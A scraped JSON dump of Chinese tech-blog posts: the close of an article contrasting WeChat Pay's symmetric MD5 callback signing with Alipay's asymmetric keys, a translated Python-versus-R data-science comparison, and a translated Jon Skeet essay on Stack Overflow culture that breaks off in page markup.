题外话：微信支付的签名认证</h2>\n<p>在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。</p>\n<p>在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。</p>\n<h1>参考文献</h1>\n<p>https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</p>\n<p><a href=\"http://seclists.org/fulldisclosure/2018/Jul/3\">http://seclists.org/fulldisclosure/2018/Jul/3</a></p>\n<p>https://www.cnblogs.com/tongwen/p/5194483.html</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/9a51fcef743ae4aca8b8c39bcc18e02a01782e9c.jpg"},{"url_object_id": "b6c210eac000139f79578c3d3bee89d1", "title": ["数据科学领域，你该选 Python 还是 R ？"], "url": "http://blog.jobbole.com/114228/", "create_date": "2018/07/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/dd000831704fa240c532ce5ef32a7094.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, Python, R, 数据", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://blog.usejournal.com/python-vs-and-r-for-data-science-833b48ccc91d\">usejournal</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/python-vs-and-r-for-data-science?print\">开源中国</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/dd000831704fa240c532ce5ef32a7094.png\" alt=\"\"></p>\n<p>根据需求，为了那些希望知道在数据科学方面选择 Python 还是 R 编程语言的人，我发布了这篇指导文章。你可能在数据科学方面是个新手，或者你需要在一个项目中选出一个语言，这篇文章可能会帮助到你。</p>\n<p><em>非免责声明：在最大的数据科学家雇主之一（Deloitte）中，我是一个数据科学家的管理者。我也对 R 和 Python 有几十年的了解。我是个语言不可知论者，但是参与到 Python 社区已经有15年左右了。</em></p>\n<h3>还会有第三种选择</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6e7676ad2eb0bdc3e9b8ed0f511ccff6.png\" width=\"1012\" height=\"504\"></p>\n<p><a href=\"https://twitter.com/hadleywickham\" target=\"_blank\" rel=\"nofollow\">Hadley Wickham,</a> RStudio 的首席数据科学家，已经给出了答复“使用‘and’替代‘vs’”。由此，同时使用Python/R 是我将提到的第三种选择。这个选项引起了我的好奇心，而且我会在本文末尾介绍这一点。</p>\n<h3>如何比较 R 和 Python</h3>\n<p>下面是这两种语言之间一些值得比较的因素，这并不是一个完全的列表。</p>\n<ol>\n<li><strong>历史</strong>：R 和 Python 具有明显不同的历史，有时候会交叉。</li>\n<li><strong>社区</strong>：通过实际调查发现的很多复杂的社会人类学因素。</li>\n<li><strong>性能</strong>：详尽的比较以及为什么比较起来这么难。</li>\n<li><strong>第三方支持</strong>：模块，代码库，可视化，存储库，组织和开发环境。</li>\n<li><strong>用例</strong>：有些任务和工作类型适合其中一种或者另一种。</li>\n<li><strong>我们不能和睦相处吗？</strong>Python 调用 R 和 R 调用 Python 。</li>\n<li><strong>预测 R 还是 Python</strong>：吃你自家的狗粮的一个预测练习。</li>\n<li><strong>偏好</strong>：最终答案。</li>\n</ol>\n<h3>历史</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/512dfeaefeef4add39dd3ba2263cfb4e.png\" alt=\"\"></p>\n<p>简短概要：</p>\n<ul>\n<li>ABC -&gt; Python 发布（1989 Guido van Rossum）-&gt; Python 2 (2000) -&gt; Python 3 (2008)</li>\n<li>Fortan -&gt; S(贝尔实验室)-&gt; R 发布（1991 Ross Ihaka 和 Robert Gentleman）-&gt; R 1.0.0 (2000) -&gt;R  3.0.2 (2013)</li>\n</ul>\n<h1>社区</h1>\n<p>当比较Python和R的用户时，首先要记住的就是：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/4a5c7a85268a6f124e0a614d84623792.jpg\" alt=\"\"></p>\n<blockquote><p>只有50%的Python用户与R重叠</p></blockquote>\n<p>那是假定所有R程序员会用“科学和数字（Scientific and Numeric）”来称呼他。我们也确定，无论程序员的等级如何，这个分布都是正确的。</p>\n<p>要进一步了解Python“宣传”，请阅读关于Python宣传调查结果：<a href=\"https://www.linkedin.com/pulse/python-hype-survey-results-experience-any-drastic-decline-brian-ray/\" target=\"_blank\" rel=\"nofollow\">https://www.linkedin.com/pulse/python-hype-survey-results-experience-any-drastic-decline-brian-ray/</a></p>\n<p>如果我们只看科学和数字社区，这就会把我们带到第二类社区，哪个社区？在所有的科学和数字社区中有一些子社区。尽管也许还会有一些重叠，因为你会怀疑他们与大一些的R/Python社区之间的交互方式确实不同。</p>\n<p>一些使用Python/R的子社区的例子：</p>\n<ul>\n<li>深度学习</li>\n<li>机器学习</li>\n<li>高级分析</li>\n<li>预测分析</li>\n<li>统计</li>\n<li>探索和数据分析</li>\n<li>学术可惜研究</li>\n<li>几乎无穷无尽的<a href=\"https://en.wikipedia.org/wiki/Category:Computational_fields_of_study\" target=\"_blank\" rel=\"nofollow\">计算领域研究</a></li>\n</ul>\n<p>然而每个领域看起来都只致力于一个专门社区，你会发现R在如统计和探索之类的领域中更加流行。不久前，你可能会使用R进行构建运行或者做一些非常有意义的探索，而使用的时间比安装Python或者用它来做相同的探索的时候短得多。</p>\n<blockquote><p>这一切都被颠覆性的技术改变了，他们是Jupyter notebook和Anaconda。</p></blockquote>\n<blockquote><p>注：Jupyter Notebokks：在浏览器中可以编辑Python/R代码；Anaconda：可以为Python和R简单的安装和打包</p></blockquote>\n<p>既然你可以在一个方便提供报告和现成的分析的环境启动运行，就已经排除了一个横在那些想要完成这些任务的人和他们喜爱的语言之间的障碍。Python现在可以使用独立于平台的方式打包，而且可以更快的提供快速、低成本的分析比。</p>\n<p>在社区中影响了语言选择的另一个区别就是“开源”思想。不仅是开源库，还有致力于开源的协作社区的影响。讽刺的是，开源许可软件，像Tensorflow这样的软件到GNU Scientific Library（各自为Apache和GPL），他们看起来都有Python和R绑定。尽管有R的公共版权，还是有更多人纯粹的支持Python社区。另一方面，看起来有更多的企业支持R，特别是那些有统计方面历史的。</p>\n<p>最后，考虑到社区和协作，在Github上Python的支持更多。如果我要看<a href=\"https://github.com/trending/python?since=monthly\" target=\"_blank\" rel=\"nofollow\">最新Python包趋势</a>，我会看到有超过3.5万个关注的Tensorflow之类的项目。相反，如果我看<a href=\"https://github.com/trending/r?since=monthly\" target=\"_blank\" rel=\"nofollow\">R包的最新趋势</a>，像Shiny，Stan…之类的包，他们都少于2千个关注。</p>\n<h3><strong>性能</strong></h3>\n<p>性能提升很困难，因为有太多的指标和情况需要测试了，也很难基于特定的硬件来测试。一些操作在某个语言里已经做了优化，但其它语言里却还没有实现。确实，你可能会失去一些东西，比如：一些人会抱怨，一些人会离开，整个分析报告也可能会被丢弃。无论如何，生活还是要继续… …</p>\n<h3><strong>循环</strong></h3>\n<p>在继续之前，让我们先看一下 Python 和 R 是怎么样使用的。在 R 中，你是如何做循环迭代的呢？R 语言有稍微的不同。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/3355ee45243cae7bedfce5d2e44d9c23.png\" width=\"1352\" height=\"924\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6c4072518b68eb0cbbd75c175bf2205e.png\" width=\"1358\" height=\"474\"></p>\n<blockquote><p>通过一个快速的完整性检查, 包括加载时间和命令行运行时间: R 耗时 0m0.238s, Python 耗时是0m0.147s. 再次，这不是一个严谨的测试。</p></blockquote>\n<p>一个快速的测试显示 Python 代码会快很多，通常，这并不是太重要。</p>\n<p>既然速度不是重点，那数据科学家更关心哪些东西呢？从这两门语言最新的趋势发现，它们被用作命令式语言的能力是一个重要的因素。比如，大多数 Python 程序员严重依赖 Pandas 来工作。这又引出了下一个主题：两种语言都有哪些模块和库，它们又是如何实现的？这是一个更有意义的比较。</p>\n<h3><strong>第三方支持</strong></h3>\n<p><strong>包管理工具</strong></p>\n<p>Python 使用 PyPi ，R 使用 CRAN ，Anaconda 同时支持二者。</p>\n<p>CRAN 使用它内部的“install.packages”命令做分发管理。截至目前为止，CRAN 上有大约 12000 个有效的软件包。浏览一下你就会发现，大约二分之一的包是关于数据科学的，占了大约 6000 个还不止。</p>\n<p>PyPi 上有超过 CRAN 十倍数量的包，大约 141000 个左右。其中有大约 3700 个包被标识为科学工程相关的。当然还有大量的包实际是科学相关的，但并没有被正确标识出来。</p>\n<p>这两种语言好像并没有受到大量的重复劳动的影响。确实，当我在 PyPi 上搜索“随机森林”时，我搜到了 170 个项目，可是，这些包之间又有些许的不同。</p>\n<p>尽管 Python 包的数量超过 R 十倍之多，但做数据科学计算的包的数量却差不多，也许 Python 更少一些。</p>\n<p>大量有效的第三方库是非常重要的，所有东西都要从头写是非常痛苦的。同样地，我也希望你做一些工作来回馈社区。</p>\n<p><strong>速度很重要</strong></p>\n<p>DataFrames vs Pandas可能是一个更有意义和更重要的比较。</p>\n<p>我们进行一个实验：在进行复制的时候进行一个复杂的遍历，比较两者的执行时间。下面是结果：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/72423d54950ec71a90fc32b568ea872a.png\" alt=\"\"></p>\n<p>源代码： <a href=\"http://nbviewer.jupyter.org/gist/brianray/4ce15234e6ac2975b335c8d90a4b6882\" target=\"_blank\" rel=\"nofollow\">http://nbviewer.jupyter.org/gist/brianray/4ce15234e6ac2975b335c8d90a4b6882</a></p>\n<p>正如我们看到的结果，Python+Pandas要比原生的R DataFrames快很多。请注意这并不意味着Python要比R快。Pandas是基于C语言写的Numpy库的。</p>\n<p><strong>想象一下这个！</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/b2ae77f0d63aed7a3a940ff313a73aba.png\" alt=\"\"></p>\n<p>我真正想说的是ggplot2 vs matplotlib。声明：matplotlib是Python社区里我最看重的一个人写的，他教会了我Python，他就是 John D. Hunter。</p>\n<p>Matplotlib是一个强大而且可个性化定制的库，虽然不太容易学但是扩展性非常好。ggplot不但不易个性化定制而且可以说更加困难。</p>\n<p>如果你喜欢漂亮的绘图图案，而且并不需要自定义绘图，R是我的选择。如果你需要做更多的事情选择Matplotlib，他甚至可以帮助与bokeh进行交互。同样，你可能在寻找的ShinnyR对R而言也会增加其交互性。</p>\n<h3>难道我们不能同时使用两种语言吗？</h3>\n<p>有些人可能要问：你为什么不能同时使用两种语言呢？</p>\n<p>有一些情况你可以同时使用这两个。比如当：</p>\n<ul>\n<li>你的项目组或组织允许的时候。</li>\n<li>你能比较容易地同时维护这两种环境。</li>\n<li>你的代码不需要迁移到另一个系统。</li>\n<li>你不会给别人制造一些混乱。</li>\n</ul>\n<p>一些可以使两者同时工作的方法：</p>\n<ul>\n<li>Python 对 R 的包装器，比如：rpy2，pyRserve，Rpython，… (rpy2 扩展在 Jupyter 中有使用)</li>\n<li>R 也有一些包，比如：rPython，PythonInR，<a href=\"https://cran.r-project.org/web/packages/reticulate/index.html\" target=\"_blank\" rel=\"nofollow\">reticulate</a>，rJython，SnakeCharmR，XRPython</li>\n<li>在 Jupyter 里，混合这两种语言，举例如下：</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/eb609017fc373624a9477f7565f8e594.png\" alt=\"\"></p>\n<p>然后，我们可以传递 pandas 数据帧，它会通过 rpy2 被自动转换为 R 数据帧，传递时加上 “-i df”开关。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/7456500daa401f5ea458c33adf684076.png\" alt=\"\"></p>\n<p>代码源: <a href=\"http://nbviewer.jupyter.org/gist/brianray/734bd54f468d9a6db9171b2cfc98405a\" target=\"_blank\" rel=\"nofollow\">http://nbviewer.jupyter.org/gist/brianray/734bd54f468d9a6db9171b2cfc98405a</a></p>\n<h3>R 与 Python 预测</h3>\n<p><a href=\"https://www.kaggle.com/nanomathias\" target=\"_blank\" rel=\"nofollow\">Kaggle 上的一个用户</a>写了一个关于<a href=\"https://www.kaggle.com/nanomathias/predicting-r-vs-python\" target=\"_blank\" rel=\"nofollow\">预测开发人员使用 R 还是 Python</a> 的内核。他根据这些数据得出了一些有趣的观察结果:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fa7922d8d111cdfab58c1ca9efec415d.png\" alt=\"\"></p>\n<ul>\n<li>如果你希望明年转向 Linux ，你更有可能是一个 Python 用户。</li>\n<li>如果你研究统计学，你更有可能是 R 用户。如果你研究计算机科学，你可能是 Python 用户。</li>\n<li>如果你年轻（18-24岁），你更可能是 Python 用户。</li>\n<li>如果你进行代码竞赛，你更可能是 Python 用户。</li>\n<li>如果你明年想使用安卓，你更可能是 Python 用户。</li>\n<li>如果你明年想学习 SQL ，你更可能是 R 用户。</li>\n<li>如果你使用 MS office ，你更可能是 R 用户。</li>\n<li>如果你明年想使用 Rasperry Pi ，你更可能是一个 Python 用户。</li>\n<li>如果你是全日制学生，你更可能是 Python 用户。</li>\n<li>如果你使用敏捷方法，你更可能是 Python 用户。</li>\n<li>如果你对 AI 的看法是担忧而不是兴奋，你更可能是 R 用户。</li>\n</ul>\n<h2>偏好</h2>\n<p>当我与Alex Martelli, Googler 和 Stack Overflow的统治者通信时，他向我解释为什么Google开始使用他们官方支持的一些语言。即使在像Google这样的自由精神创新空间，似乎有一些制度。这是在这里能起作用的偏好，公司偏好。</p>\n<p>除了企业偏好，有些人在组织里经常创造第一。我知道在Deloitte第一个使用R语言的是谁。他仍然在公司，他是数据学家的领军人。重点是，在所有事情上我通常会建议，遵循你的爱。爱你所追随的，引领潮流，爱你所做的。</p>\n<p>一个合格的声明，虽然我从未成为工具的第一思考着，但如果你正在做一写重要的事情，那可能不是做实验的最佳时机。错误是可能的。然而，每个精心的设计数据科学项目都给数据学家留下了一定的空间。使用其中的一部分来学习和实验。保持开源心态，拥抱多样性。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114228\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114228votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114228\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/be000b8e51b341ae219135db8c48438ce60885cf.jpg"},{"url_object_id": "3c54b89b3dd03db77b3745813da08bcc", "title": ["如何成为 StackOverflow 上合格的提问者与回答者"], "url": "http://blog.jobbole.com/114166/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/03/6dd085bf97f82f786b71b4fbcdb37e88.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "其他, StackOverflow", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://codeblog.jonskeet.uk/2018/03/17/stack-overflow-culture/\">JONSKEET</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>写这篇文章最直接的原因是我的朋友 Rob Conery 发了一条<a href=\"https://twitter.com/robconery/status/974678531832610816\">推特</a>，解释他为什么放弃在 Stack Overflow 贡献答案。</p>\n<p>然而，那已经是很长时间的事了。前不久，我开始写一篇与本文类似的文章，但是文章越写越长，并且没有得出任何结论。现在我用一个小时的时间写这篇文章，然后不论写了什么都要发出去（稍后可能会重新排版）。</p>\n<p>我了解很多用户对 Stack Overflow 的复杂感情。有些人认为它完全没有价值，但是我相信更多的人认为它“资源有价值，但是潜在的反对意见让人很难做出贡献”。有些人则定期做出贡献，在合理的时间范围内，偶尔解释或者查看反对意见。</p>\n<p>这篇文章，我将谈谈我的经历，和我的一些看法，关于 Stack Overflow 存在的问题、我对一些察觉到的问题持反对态度、和如何改善目前的状况。下面是我希望在二月份拜访 Stack Overflow 团队时详细讨论的主题，但我们却忙于<a href=\"https://stackoverflow.blog/2018/03/14/podcast-123-jon-skeet-wants-you-to-be-a-feminist/\">讨论其它重要问题</a>。</p>\n<p>在这篇文章中，我大部分讨论的是”提问者” 和 “回答者”，这是特意进行的简化。许多用户可能既是求助者又是回答者，我很多时候还会用不写答案但是用“view” 写评论的方式成为回答者。尽管任何用户都可以担任不同的角色，但是对提交的每个问题，每个人通常只有一个角色。当然还有其他的角色，例如“评论其它答案的评论者”，我不想花费过多的时间讨论这个问题。</p>\n<h3>目标和期望的差距</h3>\n<p>与生活中大多数事情相似，当所有人目标一致时 Stack Overflow 的表现最好，因为我们可以共同迈向那个目标。相反，当人们的目标不同时则通常会出现问题。</p>\n<p>对于 Stack Overflow 而言，最普遍的问题在于这两个目标的差异：</p>\n<ul>\n<li>– 提问者：尽量减少解决面临的问题所需要的时间</li>\n<li>– 回答者：最大限度地提高网站所有问题的价值，将网站视为长久的资源</li>\n</ul>\n<p>就我而言，我经常有一个“试图帮助提高软件工程师的诊断能力，使他们能够更好地解决自己的问题”的子目标。</p>\n<p>例如，考虑这个问题（编造的，但并不牵强） ：</p>\n<blockquote><p>Random 总是返回相同的数值，它出问题了吗？</p></blockquote>\n<p>在我看来这是一个低质量的问题（稍后我将对其进行详细讨论）。我基本知道哪里存在问题，但是为了达到我的目标我希望提问者改善这个问题，我希望看到他们的代码、结果等。如果我的答案是正确的（快速连续创建多个使用相同的基于系统时间的种子的 System.Random 的多个实例），那么这个问题很可能由于重复而被关闭，并且很可能被删除。以现在的形式，这个问题对网站没有任何好处。我不想没有确定是否重复之前就将这个问题以重复的原因关闭。</p>\n<p>现在，从提问者的角度来看，这些并不重要。如果他们知道我知道问题可能出现在哪，他们可能会认为我应该告诉他们，以便他们可以继续工作。如果现在就可以得到答案，为什么还需要花费 10 分钟来重现问题？更糟糕的是，如果他们花时间做了这些事情，然后由于重复的原因又立刻关闭这个问题，这样看上去很像在浪费时间。</p>\n<p>如果忽略情绪，我认为时间没有被浪费：</p>\n<ul>\n<li>– 提问者可以了解到，提出一个清晰的问题可以更快的得到答案。</li>\n<li>– 提问者可以了解到，搜索重复问题很有价值，因为这可能意味着根本不需要提出这个问题。</li>\n</ul>\n<p>但是我们都是普通人，忽略感情显然是个不可取的方法。在这种情况下可能发生的情况是 ( 即使我始终很有礼貌) 提问者会认为 Stack Overflow 中到处是只关心自己权利的“交警”。 我当然可以认为这是不公平的（虽然这可能会突出我的实际目标 ） 但这可能无法改变任何人的想法。</p>\n<p>因此，这是个问题。Stack Overflow 社区认同网站的目标，那么在用户提出问题时向用户明确说明网站的目标了吗？ 值得注意的是<a href=\"https://stackoverflow.com/tour\">导航页面</a>(奇怪的是网站首页没有设置该链接) 包含以下内容：</p>\n<blockquote><p>在您的帮助下，我们正在共同努力，为每个关于编程的问题建立一个详细答案库。</p></blockquote>\n<p>我倾向于稍作更改：</p>\n<blockquote><p>Stack Overflow 的目标在于创建高质量的问题库以及问题的高质量答案库。</p></blockquote>\n<p>这真的是一个共同愿景吗？如果提问者意识到这点，会有帮助吗？我是希望如此，但是我怀疑它会阻止掉所有问题（我不认为有什么能做到阻止所有问题的提问，世界不是一个完美的地方）。</p>\n<p>让我们转到另一个我与其他人有不同意见的话题：低质量问题。</p>\n<h3>是的，存在低质量问题</h3>\n<p>即使不能以完全客观的方式衡量，我也敢肯定有高质量问题和低质量问题（还有很多介于中间的）。</p>\n<p>我认为 Stack Overflow 中这样的问题可以看做高质量问题：</p>\n<ul>\n<li>– 提出一个问题，并且明确知道该问题的要求。这个问题应该能够非常明显地看出答案是否回答了问题（这与答案是否正确无关）</li>\n<li>– 避免无关紧要。这可能很困难，但是我认为这是有效工作的一部分：如果在开发 web 应用程序时遇到问题，至少应该尝试确定 web 应用程序的上下文是否与问题有关。</li>\n<li>– 对其他人尽量有帮助。这是避免不相关因素的非常重要的原因。很多用户需要将字符串解析为日期。较少人需要使用 X 框架的 Y 版本通过定制及专有网络协议与 COBOL 编写的客户端交互时将字符串解析为日期。</li>\n<li>– 阐述提问者进行过的尝试、进展以及卡住的位置。</li>\n<li>– 在适当的情况下（通常情况）包含一个证明问题的小例子。</li>\n<li>– 格式正确。不要使用整页的段落，不要使用没有格式化的代码等等。</li>\n</ul>\n<p>Stack Overflow 上有很多符合所有这些要求的问题，或符合以上大部分要求的问题。</p>\n<p>我有理由认为这样的问题比另外一些问题质量高，一些问题可能只是一个家庭作业的照片。我曾经见过这样的问题，虽然，它们并不总是那么糟糕，但是我真的不知道如果这都不能认为是一个低质量的问题，我们还能达成什么一致意见。</p>\n<p>当然，在此之间还有很多问题——但我认为接受存在低质量问题的观点非常重要，或者至少经过讨论并找出不同意见。</p>\n<h3>经验有助于写出好问题，但并非绝对必要</h3>\n<p>我看过许多文章声称 Stack Overflow 对于新用户来讲过于困难，因为，新用户很难写出一个好问题。</p>\n<p>我认为接受网站协议并愿意为之付出努力的新人，至少能提出一个合理的问题。他们可能需要花费更长的时间进行研究并写出问题，而且写出的问题可能不会像有经验的人在相同情况下写出的问题那样简单。但是我相信，整体而言，新用户能够写出质量足够好的问题。他们可能没有意识到他们需要做什么或者为什么这样做，但这是一个拥有不同解决方案的问题。而不仅仅是”提问者可能是技术新手，所以我们需要回答没有任何帮助的糟糕问题”。</p>\n<p>一个稍稍不同的问题是用户是否具有写出真正优秀问题所需的诊断技能。这是一个<a href=\"https://codeblog.jonskeet.uk/2017/08/17/diagnostics-everywhere/\">我非常重视的话题</a>，而且我真的希望有一个好的解决方案，但是我真的没有。我坚信，帮助程序员提高自己的诊断能力，除了在 Stack Overflow 中提出更好的问题之外，将对他们有巨大的好处。</p>\n<h3>一些用户在 Stack Overflow 的表现像个混蛋，但是大多数人不会这样</h3>\n<p>我当然不会宣称 Stack Overflow 社区是完美的。我看到过一些用户对提出低质量问题的人非常无理，我不是要为此进行申辩。如果你看我非常不礼貌，那么请阻止我。我不认为要求改进问题本身是粗鲁的，我们可以非常礼貌地要求改进问题，也可以非常刻薄地要求改进问题。我完全赞成提高 Stack Overflow 的文明水平，但是我认为这不能以牺牲网站质量为代价。</p>\n<p>我还经历过要求提问者提供更多信息时，提问者的反应非常无理的情况。这不是一个单向的问题。在这个方向上，我看到过比回答者更加粗鲁的行为。事实上，这些问题通常被关闭或删除，所以只是随便浏览网站的人通常不会看到这些。</p>\n<p>我的时间非常有限，所以我们来看最重要的一点，我们需要对彼此更友好。</p>\n<h3>Jon 的 Stack Overflow 宣誓</h3>\n<p>我故意把它称为<em>我的</em>宣誓，因为这不是将我的要求强加于他人的地方。如果你认为这也是你想遵循的原则（或许有一些修正），那再好不过了。如果 Stack Overflow 决定在网站指南的某个地方采用它，我非常欢迎，并且他们可以对其做任何适当的修改。</p>\n<p>从本质上来讲，我认为许多问题看起来像是提问者和回答者之间的一种交易。因此，建立一种契约是合理的（虽然这听起来更像是商业用语），因此，我倾向于使用一个诚心的宣誓。</p>\n<p><strong>作为一个回答者，我将…</strong></p>\n<ul>\n<li>不表现的像个混蛋。</li>\n<li>记住我正在回应的是人，是有感情的。</li>\n<li>认定我正在回应的人是诚心地希望得到帮助。</li>\n<li>要明确，对问题质量的评论不是对提问者的价值的指责。</li>\n<li>记住，有些时候，我正在回应的人可能会感到他们正在被指责，即使我不认为我有这个意思。</li>\n<li>要明确，评论如何改善问题时提出积极的具体建议，不要消极地强调现状。</li>\n<li>答案要清楚，记住不是每个人都与我的技术背景相同（所以有些术语可能需要链接等)。</li>\n<li>花点时间好好展示我的答案，使用尽可能易读的格式。</li>\n</ul>\n<p><strong>作为一个提问者，我将… </strong></p>\n<ul>\n<li>不表现的像个混蛋。</li>\n<li>记住任何一个回答问题的都是人类，都是有感情的。</li>\n<li>认定任何一个回答我问题的人都充满善意并试图帮助我。</li>\n<li>记住我是在要求其他人放弃自己的时间来帮助我解决问题。</li>\n<li>在提问之前先研究自己的问题、尽可能的缩小问题范围、给出尽可能详细的相关信息来减少回答问题的人需要花费的时间。</li>\n<li>花点时间好好提出自己的问题，使用尽可能易读的格式。</li>\n</ul>\n<p>我希望大部分时间我可以遵循这些誓言。我怀疑自己有时候做不到，所有希望通过明确的写出来，阅读它，使自己成为一个更好的社区成员。</p>\n<p>我认为如果每个人在 Stack Overflow 上发布任何内容之前都遵循这样的誓言，我们的社区将会更加美好。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/11eefac5bf4ae36c73b7b40eb087be7b.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/02a9f7817f8dd0012ff1327fde5bdc94.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114166\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114166votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114166\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">\r\n\t\t\t<img 